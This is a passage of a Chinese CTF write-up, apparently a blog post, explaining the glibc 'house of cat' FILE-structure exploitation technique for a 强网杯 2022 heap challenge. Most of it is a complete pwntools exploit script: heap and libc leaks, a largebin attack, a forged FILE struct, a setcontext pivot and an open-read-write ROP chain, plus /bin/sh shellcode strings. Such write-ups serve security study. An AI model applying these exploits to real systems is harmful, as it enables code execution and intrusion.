class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));		<span class="comment">// 计算was_writing使得为真</span></span><br><span class="line"><span class="comment">// #define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</span></span><br><span class="line"><span class="comment">// #define _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))	<span class="comment">// 绕过检查进入_IO_switch_to_wget_mode函数</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)	<span class="comment">// 绕过检查进入子块</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)	<span class="comment">// 调用_IO_WOVERFLOW函数</span></span><br><span class="line"><span class="comment">// #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>_IO_WOVERFLOW</code>函数作为宏定义，看一下汇编代码就可以理解，rdi就是我们传入的FILE的首地址，可以看到，rax成了我们的核心控制点，而rax的值也就是<code>fp-&gt;_wide_data</code>的值，rdx的值就是<code>fp-&gt;_wide_data-&gt;_IO_write_ptr</code>的值，注意在call汇编之前还会对rax进行一次赋值，那这里就随便控制了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7fc411e82d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7fc411e82d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">0x7fc411e82d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">0x7fc411e82d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7fc411e82d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7fc411e82d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56              		 &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"></span><br><span class="line">0x7fc411e82d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7fc411e82d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">0x7fc411e82d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>绕过的检查有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_read_base != fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 或者 fp-&gt;_flags &amp; 0x0800 != 0</span><br><span class="line">fp-&gt;_mode = 0</span><br></pre></td></tr></table></figure>



<h3 id="house-of-cat-强网2022-1"><a href="#house-of-cat-强网2022-1" class="headerlink" title="house_of_cat(强网2022)"></a>house_of_cat(强网2022)</h3><p>这道题已经给出了house_of_apple2的解法，这里给出house_of_cat的解法也是预期解，同时整理一下模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./house_of_cat&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    pld = <span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    pld = <span class="string">&#x27;CAT | r00t QWB QWXF$\xff\xff\xff\xff&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    <span class="comment"># only twice</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">8</span>)) - <span class="number">0xaf0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0xaf0</span>)</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)    <span class="comment"># bk_nextsize</span></span><br><span class="line">edit(<span class="number">2</span>, pld)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># largebin_attack</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1dd0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x468</span>, orw)     <span class="comment"># 10</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))    <span class="comment"># change top_chunk.size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf</span>))</span><br><span class="line">dbg()</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Heap/" rel="tag"># Heap</a>
          
            <a href="/tags/IO/" rel="tag"># IO</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/08/10/Pwn/LLVM/" rel="next" title="LLVM PASS PWN">
                <i class="fa fa-chevron-left"></i> LLVM PASS PWN
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/08/23/CTF/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="prev" title="2022 巅峰极客">
                2022 巅峰极客 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
